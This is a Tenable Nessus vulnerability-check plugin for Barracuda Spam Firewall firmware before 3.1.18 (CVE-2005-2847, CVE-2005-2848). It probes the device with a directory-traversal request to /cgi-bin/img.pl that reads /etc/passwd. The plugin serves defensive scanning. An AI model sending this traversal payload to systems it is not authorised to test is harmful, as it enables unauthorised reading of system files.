#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(19556);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2847", "CVE-2005-2848");
  script_bugtraq_id(14710, 14712);
  script_xref(name:"OSVDB", value:"19279");

  script_name(english:"Barracuda Spam Firewall < 3.1.18 Multiple Vulnerabilities (Cmd Exec, Traversal)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Barracuda Spam Firewall network
appliance, which protects mail servers from spam, viruses, and the
like. 

Further, it appears that the installed appliance suffers from several
vulnerabilities that allow for execution of arbitrary code and reading
of arbitrary files, all subject to the permissions of the web server
user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to firmware 3.1.18 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Barracuda Spam Firewall firmware < 3.1.18";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Try to exploit one of the flaws to read /etc/passwd.
r = http_send_recv3(method:"GET", port:port,
  item:string("/cgi-bin/img.pl?","f=../etc/passwd"));
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if there's an entry for root.
if (egrep(string:res, pattern:"root:.*:0:[01]:"))
  security_hole(port);
